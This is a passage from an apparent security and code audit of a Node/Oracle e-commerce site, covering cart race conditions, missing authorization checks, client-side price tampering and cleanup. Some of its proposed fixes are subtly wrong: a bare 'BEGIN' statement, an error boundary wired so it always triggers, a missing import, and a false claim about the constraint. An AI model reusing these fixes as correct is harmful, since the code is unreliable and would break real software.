        </h1>

        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
          {/* Dashboard widgets */}
        </div>

        {/* Admin content */}
      </div>
    </div>
  );
}
```

---

## Issue #7: Cart Race Condition (Multi-User Bug)

**File:** `backend/routes/cart.js`  
**Severity:** 🔴 CRITICAL - Data Corruption

### Problem:

```javascript
// ❌ MULTIPLE CARTS CAN EXIST FOR SAME USER
const cartCheck = await executeQuery(
  'SELECT CART_ID FROM CART WHERE USER_ID = :userId',
  { userId }
);

let cartId;
if (cartCheck.rows && cartCheck.rows.length > 0) {
  cartId = cartCheck.rows[0].CART_ID; // Takes FIRST cart only
  // But other carts still exist!
}
```

**Scenario:**
1. Request A: `SELECT CART FROM WHERE USER=1` → No cart found
2. Request B: `SELECT CART FROM WHERE USER=1` → No cart found
3. Request A: `INSERT CART` → Creates CART_ID=100
4. Request B: `INSERT CART` → Creates CART_ID=101 (race condition!)
5. Now user has 2 carts!

### Fix:

```javascript
// File: backend/routes/cart.js (FIXED)
const express = require('express');
const router = express.Router();
const { executeQuery, executeUpdate, getConnection } = require('../config/db');
const oracledb = require('oracledb');

/**
 * ✅ FIXED: Get or create single cart with transaction lock
 */
async function getOrCreateCart(userId) {
  const connection = await getConnection();
  
  try {
    // ✅ Start transaction
    await connection.execute('BEGIN', [], { autoCommit: false });

    // ✅ Use FOR UPDATE to lock row (if exists)
    const existingCart = await connection.execute(
      `SELECT CART_ID FROM CART WHERE USER_ID = :userId FOR UPDATE`,
      { userId },
      { outFormat: oracledb.OUT_FORMAT_OBJECT, autoCommit: false }
    );

    let cartId;

    if (existingCart.rows && existingCart.rows.length > 0) {
      // Cart exists - use it
      cartId = existingCart.rows[0].CART_ID;
    } else {
      // No cart - create one
      const seqResult = await connection.execute(
        'SELECT cart_seq.NEXTVAL as ID FROM DUAL',
        [],
        { outFormat: oracledb.OUT_FORMAT_OBJECT, autoCommit: false }
      );

      cartId = seqResult.rows[0].ID;

      await connection.execute(
        `INSERT INTO CART (CART_ID, USER_ID, CREATED_AT) 
         VALUES (:cartId, :userId, SYSDATE)`,
        { cartId, userId },
        { autoCommit: false }
      );
    }

    await connection.commit();
    return cartId;
  } catch (error) {
    await connection.rollback();
    throw error;
  } finally {
    try {
      await connection.close();
    } catch (err) {
      console.error('[CART] Connection close error:', err);
    }
  }
}

/**
 * POST /api/cart/add
 * Add product to cart (with transaction safety)
 */
router.post('/add', async (req, res) => {
  try {
    const { userId, masp, soluong } = req.body;

    // Validate input
    if (!userId || !masp || !soluong || soluong <= 0) {
      return res.status(400).json({
        success: false,
        message: 'Invalid input: userId, masp, soluong (positive) required'
      });
    }

    console.log(`[CART] Adding ${soluong}x ${masp} to user ${userId} cart`);

    // ✅ Check product exists and has stock
    const productCheck = await executeQuery(
      'SELECT SOLUONGTON, GIABAN FROM SANPHAM WHERE MASP = :masp',
      { masp }
    );

    if (!productCheck.rows || productCheck.rows.length === 0) {
      return res.status(404).json({
        success: false,
        message: `Product ${masp} not found`
      });
    }

    const product = productCheck.rows[0];
    if (product.SOLUONGTON < soluong) {
      return res.status(400).json({
        success: false,
        message: `Not enough stock. Available: ${product.SOLUONGTON}`
      });
    }

    // ✅ Get or create cart (transaction-safe)
    const cartId = await getOrCreateCart(userId);

    const connection = await getConnection();

    try {
      await connection.execute('BEGIN', [], { autoCommit: false });

      // ✅ Check if product already in cart
      const itemCheck = await connection.execute(
        `SELECT SOLUONG FROM CART_ITEM WHERE CART_ID = :cartId AND MASP = :masp FOR UPDATE`,
        { cartId, masp },
        { outFormat: oracledb.OUT_FORMAT_OBJECT, autoCommit: false }
      );

      if (itemCheck.rows && itemCheck.rows.length > 0) {
        // Update quantity
        const currentQty = itemCheck.rows[0].SOLUONG;
        const newQty = currentQty + soluong;

        if (product.SOLUONGTON < newQty) {
          throw new Error(`Total would exceed available stock (${product.SOLUONGTON})`);
        }

        await connection.execute(
          `UPDATE CART_ITEM SET SOLUONG = :newQty WHERE CART_ID = :cartId AND MASP = :masp`,
          { newQty, cartId, masp },
          { autoCommit: false }
        );

        console.log(`[CART] Updated ${masp} quantity to ${newQty}`);
      } else {
        // Insert new item
        const itemSeqResult = await connection.execute(
          'SELECT cart_item_seq.NEXTVAL as ID FROM DUAL',
          [],
          { outFormat: oracledb.OUT_FORMAT_OBJECT, autoCommit: false }
        );

        const itemId = itemSeqResult.rows[0].ID;

        await connection.execute(
          `INSERT INTO CART_ITEM (ITEM_ID, CART_ID, MASP, SOLUONG, CREATED_AT)
           VALUES (:itemId, :cartId, :masp, :soluong, SYSDATE)`,
          { itemId, cartId, masp, soluong },
          { autoCommit: false }
        );

        console.log(`[CART] Added new product ${masp} (qty: ${soluong})`);
      }

      await connection.commit();

      res.json({
        success: true,
        message: 'Product added to cart',
        cartId,
        masp,
        quantityAdded: soluong
      });
    } catch (error) {
      await connection.rollback();
      throw error;
    } finally {
      try {
        await connection.close();
      } catch (err) {
        console.error('[CART] Connection close error:', err);
      }
    }
  } catch (error) {
    console.error('[CART ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to add to cart',
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

/**
 * GET /api/cart/:userId
 * Get user's cart
 */
router.get('/:userId', async (req, res) => {
  try {
    const { userId } = req.params;

    // ✅ Get single cart for user
    const cartQuery = `
      SELECT c.CART_ID
      FROM CART c
      WHERE c.USER_ID = :userId
      FETCH FIRST 1 ROW ONLY
    `;

    const cartResult = await executeQuery(cartQuery, { userId });

    if (!cartResult.rows || cartResult.rows.length === 0) {
      return res.json({
        success: true,
        data: {
          cartId: null,
          items: [],
          total: 0
        }
      });
    }

    const cartId = cartResult.rows[0].CART_ID;

    // Get cart items
    const itemsQuery = `
      SELECT 
        ci.ITEM_ID, ci.MASP, ci.SOLUONG,
        sp.TENSP, sp.GIABAN, sp.SOLUONGTON, sp.HINHANH,
        (ci.SOLUONG * sp.GIABAN) AS ITEM_TOTAL
      FROM CART_ITEM ci
      JOIN SANPHAM sp ON ci.MASP = sp.MASP
      WHERE ci.CART_ID = :cartId
      ORDER BY ci.CREATED_AT DESC
    `;

    const itemsResult = await executeQuery(itemsQuery, { cartId });
    const items = itemsResult.rows || [];
    const total = items.reduce((sum, item) => sum + item.ITEM_TOTAL, 0);

    res.json({
      success: true,
      data: {
        cartId,
        items,
        total,
        itemCount: items.length
      }
    });
  } catch (error) {
    console.error('[CART ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch cart'
    });
  }
});

module.exports = router;
```

**Also add database constraint:**

```sql
-- Ensure only one cart per user
ALTER TABLE CART ADD CONSTRAINT uk_cart_user_id UNIQUE (USER_ID);

-- If constraint already exists, this won't fail
```

---

## Issue #8: No Token Verification in Protected API Calls

**File:** `backend/routes/cart.js`, `backend/routes/order.js`, and others  
**Severity:** 🔴 CRITICAL - Any user can access any cart/order

### Problem:

```javascript
// ❌ NO TOKEN CHECK
router.get('/:userId', async (req, res) => {
  // User can pass userId=999 and get someone else's cart!
  const cartItems = await executeQuery(
    `SELECT * FROM CART WHERE USER_ID = :userId`,
    { userId: req.params.userId }
  );
  res.json({ success: true, data: cartItems });
});
```

### Fix - Add Authentication:

```javascript
// File: backend/routes/cart.js (TOP of file)
const { verifyToken } = require('../middleware/auth');

// ✅ ADD verifyToken middleware
router.get('/:userId', verifyToken, async (req, res) => {
  try {
    const { userId } = req.params;
    const requestingUserId = req.user.userId; // From JWT token

    // ✅ Check user can only access own cart
    if (parseInt(userId) !== parseInt(requestingUserId)) {
      return res.status(403).json({
        success: false,
        message: 'Forbidden: Cannot access another user\'s cart'
      });
    }

    // Now it's safe to query
    const cartResult = await executeQuery(
      'SELECT CART_ID FROM CART WHERE USER_ID = :userId',
      { userId: requestingUserId }
    );

    // ... rest of code ...
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error' });
  }
});
```

Apply `verifyToken` middleware to ALL protected endpoints:
- `GET /api/cart/:userId` ✅ Add middleware
- `POST /api/cart/add` ✅ Add middleware
- `DELETE /api/cart/:cartItemId` ✅ Add middleware
- `POST /api/order/create` ✅ Add middleware
- `GET /api/order/:orderId` ✅ Add middleware (verify user owns order)
- `GET /api/profile` ✅ Add middleware
- `PUT /api/profile` ✅ Add middleware

---

# 🟠 MAJOR ISSUES (P1 - Fix Next)

## Issue #9: Product ID Generation Not Unique

**File:** `backend/routes/product.js` line 145  
**Severity:** 🟠 MAJOR - Data Corruption Possible

### Problem:
```javascript
const newId = `SP${Date.now()}${Math.floor(Math.random() * 1000)}`;
// Date.now() = millisecond precision
// Random range = 0-999
// Collision possible if 2 requests same millisecond with same random!
```

### Fix - Use Oracle Sequence:
```javascript
// File: backend/routes/product.js - POST route (FIXED)
router.post('/', verifyToken, requireRole('ADMIN'), async (req, res) => {
  try {
    const connection = await getConnection();
    
    // ✅ Use Oracle sequence instead of Date.now()
    const seqResult = await connection.execute(
      'SELECT SANPHAM_SEQ.NEXTVAL as NEWID FROM DUAL',
      [],
      { outFormat: require('oracledb').OUT_FORMAT_OBJECT }
    );
    
    const newId = 'SP' + seqResult.rows[0].NEWID;

    // ... rest of code ...
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error' });
  }
});
```

---

## Issue #10: VNPay Integration Incomplete

**File:** `backend/routes/payment.js` line 419  
**Severity:** 🟠 MAJOR - Payment Status Returns Fake Data

### Problem:
```javascript
router.post('/query', async (req, res) => {
  // TODO: Implement actual HTTP call to VNPay queryDr endpoint
  // Currently returns MOCK_RESPONSE!
  
  res.json({
    success: true,
    status: 'MOCK_RESPONSE'
  });
});
```

### Fix - Implement Real VNPay Query:
```javascript
// File: backend/routes/payment.js (FIXED)
const vnpayUtils = require('../utils/vnpayUtils');
const axios = require('axios');

/**
 * POST /api/payment/query
 * Query payment status from VNPay
 */
router.post('/query', verifyToken, async (req, res) => {
  try {
    const { orderId, transactionId } = req.body;

    if (!orderId || !transactionId) {
      return res.status(400).json({
        success: false,
        message: 'orderId and transactionId required'
      });
    }

    // ✅ Build VNPay query request
    const queryData = {
      vnp_RequestId: `${Date.now()}`,
      vnp_Version: '2.1.0',
      vnp_Command: 'queryDr',
      vnp_TmnCode: vnpayConfig.tmnCode,
      vnp_TxnRef: transactionId,
      vnp_OrderInfo: `Query order ${orderId}`,
      vnp_CreateDate: formatDateForVNPay(new Date()),
      vnp_IpAddr: req.ip || '127.0.0.1'
    };

    // ✅ Generate secure hash
    const hash = vnpayUtils.generateHash(queryData, vnpayConfig.secretKey);
    queryData.vnp_SecureHash = hash;

    // ✅ Make actual HTTP request to VNPay
    const vnpayResponse = await axios.post(
      vnpayConfig.vnpayApiUrl,
      queryData,
      {
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 10000
      }
    );

    console.log(`[PAYMENT] VNPay query response for transaction ${transactionId}:`, vnpayResponse.data);

    // ✅ Parse VNPay response
    const vnpResponseCode = vnpayResponse.data.vnp_ResponseCode;

    if (vnpResponseCode === '00') {
      // Success - transaction found
      const transactionStatus = vnpayResponse.data.vnp_TransactionStatus;
      
      // Update order status if needed
      if (transactionStatus === '00') {
        // Transaction successful
        await executeUpdate(
          `UPDATE ORDERS SET STATUS = 'PAID', UPDATED_AT = SYSDATE WHERE ORDER_ID = :orderId`,
          { orderId }
        );

        await executeUpdate(
          `UPDATE PAYMENT_TRANSACTIONS SET STATUS = 'SUCCESS', UPDATED_AT = SYSDATE WHERE TRANSACTION_ID = :transactionId`,
          { transactionId }
        );
      }

      res.json({
        success: true,
        transactionId,
        status: transactionStatus === '00' ? 'SUCCESS' : 'PENDING',
        amount: vnpayResponse.data.vnp_Amount ? vnpayResponse.data.vnp_Amount / 100 : null,
        bankCode: vnpayResponse.data.vnp_BankCode
      });
    } else if (vnpResponseCode === '01') {
      // No transaction found
      res.status(404).json({
        success: false,
        message: 'Transaction not found on VNPay'
      });
    } else {
      // Error from VNPay
      res.status(400).json({
        success: false,
        message: `VNPay error: ${vnpayResponse.data.vnp_Message}`,
        code: vnpResponseCode
      });
    }
  } catch (error) {
    console.error('[PAYMENT QUERY ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to query payment status',
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});
```

---

## Issue #11: Input Validation Missing on Admin Routes

**File:** `backend/routes/admin.js`  
**Severity:** 🟠 MAJOR - SQL Injection / XSS Risk

### Problem:
```javascript
// ❌ NO VALIDATION
const { email, fullname, role } = req.body;

// Email could be malicious string
// Fullname could contain script tags
// Role is only partially validated

await executeUpdate(`UPDATE USERS SET EMAIL=?, FULLNAME=? WHERE USER_ID=?`, ...);
```

### Fix - Validate All Inputs:
```javascript
// File: backend/routes/admin.js (FIXED)
const { validateEmail, validatePassword, sanitizeInput } = require('../utils/validators');

router.put('/users/:userId', verifyToken, requireRole('ADMIN'), async (req, res) => {
  try {
    const { userId } = req.params;
    let { email, fullname, role, status } = req.body;

    // ✅ Validate email format
    if (email) {
      const emailValidation = validateEmail(email);
      if (!emailValidation.isValid) {
        return res.status(400).json({
          success: false,
          message: emailValidation.error
        });
      }
    }

    // ✅ Validate fullname length and content
    if (fullname) {
      fullname = sanitizeInput(fullname.trim());
      if (fullname.length < 2 || fullname.length > 100) {
        return res.status(400).json({
          success: false,
          message: 'Full name must be 2-100 characters'
        });
      }
    }

    // ✅ Validate role (whitelist)
    if (role) {
      if (!['USER', 'ADMIN'].includes(role)) {
        return res.status(400).json({
          success: false,
          message: `Invalid role. Must be USER or ADMIN`
        });
      }
    }

    // ✅ Validate status (whitelist)
    if (status) {
      if (!['ACTIVE', 'PENDING', 'BLOCKED', 'DELETED'].includes(status)) {
        return res.status(400).json({
          success: false,
          message: `Invalid status. Must be ACTIVE, PENDING, BLOCKED, or DELETED`
        });
      }
    }

    // Now safe to update
    const updateQuery = `
      UPDATE USERS
      SET 
        EMAIL = NVL(:email, EMAIL),
        FULLNAME = NVL(:fullname, FULLNAME),
        ROLE = NVL(:role, ROLE),
        STATUS = NVL(:status, STATUS),
        UPDATED_AT = CURRENT_TIMESTAMP
      WHERE USER_ID = :userId
    `;

    await executeUpdate(updateQuery, {
      userId,
      email: email?.toLowerCase() || null,
      fullname: fullname || null,
      role: role || null,
      status: status || null
    });

    console.log(`[ADMIN] User ${userId} updated by admin ${req.user.userId}`);

    res.json({
      success: true,
      message: 'User updated successfully'
    });
  } catch (error) {
    console.error('[ADMIN ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to update user'
    });
  }
});
```

---

## Issue #12: Cart Stored Locally Only (Data Integrity)

**File:** `app/cart/page.tsx`  
**Severity:** 🟠 MAJOR - User Can Manipulate Prices

### Problem:
```tsx
// ❌ STORED IN localStorage - User can manipulate
const handleCheckout = () => {
  localStorage.setItem('cart', JSON.stringify(cartItems)); // ← LOCAL ONLY
  // User can open DevTools and change GIABAN to 0!
};
```

### Fix - Always Fetch Fresh Data from Server:
```tsx
// File: app/checkout/page.tsx (FIXED)
'use client';

import { useState, useEffect } from 'react';
import { authAPI, cartAPI, orderAPI } from '@/lib/api';

export default function CheckoutPage() {
  const router = useRouter();
  const [user, setUser] = useState<any>(null);
  const [cartItems, setCartItems] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const currentUser = authAPI.getCurrentUser();
    if (!currentUser) {
      router.push('/login');
      return;
    }

    setUser(currentUser);

    // ✅ Fetch fresh cart from server (not localStorage)
    const fetchCart = async () => {
      try {
        setLoading(true);
        const cartData = await cartAPI.getCart(currentUser.userId);
        setCartItems(cartData.items || []);
      } catch (err: any) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };

    fetchCart();
  }, [router]);

  const handleCheckout = async () => {
    if (!user || cartItems.length === 0) {
      setError('Cart is empty');
      return;
    }

    try {
      setSubmitting(true);

      // ✅ Re-fetch cart data from server before checkout (verify no tampering)
      const freshCart = await cartAPI.getCart(user.userId);

      // ✅ Verify prices haven't changed
      let totalMismatch = false;
      for (let i = 0; i < freshCart.items.length; i++) {
        const fresh = freshCart.items[i];
        const old = cartItems[i];
        
        if (fresh.MASP !== old.MASP || fresh.SOLUONG !== old.SOLUONG) {
          totalMismatch = true;
          break;
        }

        // Check price isn't too different (allow small variation)
        const priceDiff = Math.abs(fresh.GIABAN - old.GIABAN);
        if (priceDiff > 100) { // 100 VND tolerance
          console.warn(`Price changed for ${fresh.MASP}: ${old.GIABAN} → ${fresh.GIABAN}`);
          totalMismatch = true;
          break;
        }
      }

      if (totalMismatch) {
        setError('Cart data changed. Please refresh and try again.');
        // Reload cart
        const newCart = await cartAPI.getCart(user.userId);
        setCartItems(newCart.items);
        return;
      }

      // ✅ Create order with fresh data
      const order = await orderAPI.createOrder(user.userId, 'ONLINE');

      // ✅ Clear local cart cache
      localStorage.removeItem('cart');

      // Redirect to payment
      router.push(`/order-success?orderId=${order.orderId}`);
    } catch (err: any) {
      setError(err.message);
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) return <div>Loading...</div>;

  return (
    <div className="checkout">
      <h1>Checkout</h1>

      {error && <div className="error">{error}</div>}

      <div className="cart-summary">
        {cartItems.map(item => (
          <div key={item.ITEM_ID}>
            <span>{item.TENSP}</span>
            <span>{item.SOLUONG} × {item.GIABAN.toLocaleString('vi-VN')} VND</span>
            <span>{(item.SOLUONG * item.GIABAN).toLocaleString('vi-VN')} VND</span>
          </div>
        ))}
        <div className="total">
          Total: {cartItems.reduce((sum, item) => sum + item.SOLUONG * item.GIABAN, 0).toLocaleString('vi-VN')} VND
        </div>
      </div>

      <button onClick={handleCheckout} disabled={submitting}>
        {submitting ? 'Processing...' : 'Place Order'}
      </button>
    </div>
  );
}
```

---

# 🟡 MINOR ISSUES (Should Fix)

## Issue #13: Duplicate Chatbot Routes

**Files:** `backend/routes/chatbot.js` AND `backend/routes/chatbot-enhanced.js`  
**Severity:** 🟡 MINOR - Dead Code

**Status:** Only `chatbot.js` is mounted, `chatbot-enhanced.js` is **UNUSED**

### Fix:
```bash
# Delete unused file
rm backend/routes/chatbot-enhanced.js

# Delete associated setup file
rm backend/setup-chatbot-enhanced.js

# Update documentation
# Remove references to chatbot-enhanced
```

---

## Issue #14: Unused Utility Files

**Files to Delete:**

```bash
# Test/Setup files (not used in production)
rm backend/test-db.js
rm backend/test-payment-api.js
rm backend/test-order-creation.js
rm backend/test-full-payment.js
rm backend/setup-test-order.js
rm backend/setup-review-system.js
rm backend/setup-recommendation-system.js
rm backend/setup-profile-system.js
rm backend/setup-chatbot-enhanced.js
rm backend/check-user-id-type.js
rm backend/check-schema.js
rm backend/check-orders-columns.js
rm backend/check-users-columns.js
rm backend/check-wishlist-columns.js
rm backend/add-payment-method-column.js
rm backend/cleanup-db.js
rm backend/fix-sequence.js
rm backend/create-payment-tables.js

# Old fix files (documentation only)
rm FIXES_SECURITY_1_authUtils.js
rm FIXES_SECURITY_2_cookies.js
rm FIXES_STRUCTURE_1_apiResponse.js
rm FIXES_LOGIC_1_admin_routes.js
rm check-tables.js

# Old documentation (replaced by FULL_SYSTEM_AUDIT_AND_FIXES.md)
rm AUDIT_REPORT_COMPREHENSIVE.md
rm AUDIT_REPORT_CRITICAL.md
```

---

## Issue #15: Multiple Unused ChatBot Components

**Components:** 
- `components/ChatBot.tsx`
- `components/ChatBotClient.tsx` 
- `components/ChatBotWrapper.tsx`
- `components/EnhancedChatBot.tsx` (duplicate)
- `components/ChatBotStatsAdmin.tsx`

**Recommendation:** Consolidate into single `components/ChatBot.tsx`

---

## Issue #16: No Error Boundary on App

**Current:** Single component crash crashes entire app  
**Fix:** Add Error Boundary

```tsx
// File: app/error-boundary.tsx (CREATE NEW)
'use client';

import { useEffect } from 'react';

export default function ErrorBoundary({
  error,
  reset,
}: {
  error: Error;
  reset: () => void;
}) {
  useEffect(() => {
    console.error('[ERROR BOUNDARY]', error);
  }, [error]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-red-50">
      <div className="bg-white rounded-lg shadow-xl p-8 text-center">
        <h1 className="text-4xl font-bold text-red-600 mb-4">
          ❌ Something went wrong
        </h1>
        <p className="text-gray-700 mb-6">
          {error.message || 'An unexpected error occurred'}
        </p>
        <button
          onClick={reset}
          className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700"
        >
          Try again
        </button>
      </div>
    </div>
  );
}
```

```tsx
// File: app/layout.tsx (MODIFY)
import ErrorBoundary from './error-boundary';

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html>
      <body>
        <ErrorBoundary error={new Error()} reset={() => {}}>
          {children}
        </ErrorBoundary>
      </body>
    </html>
  );
}
```

---

## Issue #17: Database Schema Naming Inconsistencies

**Current (MESSY):**
```
✗ TENSP vs PRODUCT_NAME
✗ MASP vs PRODUCT_ID
✗ SOLUONGTON vs STOCK_QUANTITY
✗ GIABAN vs PRICE
✗ MOTA vs DESCRIPTION
✗ HINHANH vs IMAGE_URL
✗ FULLNAME vs FULL_NAME
```

**Fix Option 1: Create Normalized Views**

```sql
-- File: backend/database/normalize-schema.sql
CREATE OR REPLACE VIEW V_PRODUCT AS
SELECT 
  MASP AS product_id,
  TENSP AS product_name,
  GIABAN AS price,
  SOLUONGTON AS stock_quantity,
  HINHANH AS image_url,
  MOTA AS description,
  MANCC AS supplier_id
FROM SANPHAM;

CREATE OR REPLACE VIEW V_USER AS
SELECT 
  USER_ID AS user_id,
  USERNAME AS username,
  EMAIL AS email,
  FULLNAME AS full_name,
  ROLE AS role,
  STATUS AS status
FROM USERS;

-- Then use views in application code:
-- SELECT * FROM V_PRODUCT WHERE product_id = ?
```

**Fix Option 2: Update Backend Queries**

Map columns in application:
```javascript
// Utility function
function mapProductRow(row) {
  return {
    productId: row.MASP,
    name: row.TENSP,
    price: row.GIABAN,
    stockQty: row.SOLUONGTON,
    imageUrl: row.HINHANH,
    description: row.MOTA
  };
}

// Use in route handlers
router.get('/:id', async (req, res) => {
  const result = await executeQuery(`SELECT * FROM SANPHAM WHERE MASP = :id`, ...);
  const product = mapProductRow(result.rows[0]);
  res.json({ success: true, data: product });
});
```

---

# 📋 FILES TO DELETE (CLEANUP)

```bash
# Test files (never used in production)
rm backend/test-db.js
rm backend/test-payment-api.js
rm backend/test-order-creation.js
rm backend/test-full-payment.js

# Setup scripts (one-time only, not needed)
rm backend/setup-test-order.js
rm backend/setup-review-system.js
rm backend/setup-recommendation-system.js
rm backend/setup-profile-system.js
rm backend/setup-chatbot-enhanced.js

# Check scripts (debugging only)
rm backend/check-user-id-type.js
rm backend/check-schema.js
rm backend/check-orders-columns.js
rm backend/check-users-columns.js
rm backend/check-wishlist-columns.js

# DB migration scripts (one-time)
rm backend/add-payment-method-column.js
rm backend/cleanup-db.js
rm backend/fix-sequence.js
rm backend/create-payment-tables.js

# Old documentation files
rm FIXES_SECURITY_1_authUtils.js
rm FIXES_SECURITY_2_cookies.js
rm FIXES_STRUCTURE_1_apiResponse.js
rm FIXES_LOGIC_1_admin_routes.js
rm check-tables.js
rm AUDIT_REPORT_COMPREHENSIVE.md
rm AUDIT_REPORT_CRITICAL.md

# Unused route
rm backend/routes/chatbot-enhanced.js
```

---

# 📊 SUMMARY: Priority Fixes

## 🔴 CRITICAL (Fix Today - P0):
1. ✅ Add `verifyToken, requireRole('ADMIN')` to ALL admin routes
2. ✅ Add `verifyToken, requireRole('ADMIN')` to product CRUD
3. ✅ Remove client-side role selection from registration
4. ✅ Switch to HTTP-only cookie-based authentication
5. ✅ Fix cart race condition with transaction locking
6. ✅ Add `verifyToken` to all user-specific endpoints (cart, order, profile)
7. ✅ Refactor order creation to use batch insert (1 query instead of 3N)

**Estimated Time:** 8-10 hours  
**Files to Modify:** 6 files

---

## 🟠 MAJOR (Fix This Week - P1):
8. ✅ Use Oracle sequences for product IDs
9. ✅ Implement real VNPay query endpoint
10. ✅ Add input validation to all admin APIs
11. ✅ Fetch fresh cart data before checkout
12. ✅ Add auth check to admin frontend pages
13. ✅ Delete duplicate chatbot routes

**Estimated Time:** 12-15 hours  
**Files to Modify:** 8 files

---

## 🟡 MINOR (Nice to Have - P2):
14. Delete test/setup files (cleanup)
15. Add error boundary to app
16. Consolidate chatbot components
17. Create normalized views for schema

**Estimated Time:** 5-8 hours  
**Files to Delete:** 20+ files

---

# ✅ TESTING CHECKLIST

After fixes, test:

```
[ ] Register as user (cannot select ADMIN)
[ ] Login (token in cookies, not localStorage)
[ ] Add product to cart (only 1 cart per user)
[ ] Checkout (prices verified from server)
[ ] Create order (single transaction, batch insert)
[ ] Admin can modify users
[ ] Admin cannot be escalated by users
[ ] Try accessing /admin as regular user (redirect)
[ ] Payment query returns real VNPay status
[ ] Multiple concurrent requests (no race conditions)
[ ] All admin APIs require AUTH token
```

---

**Report Generated:** May 1, 2026
**Status:** Ready for Implementation
**Next Step:** Begin with CRITICAL fixes

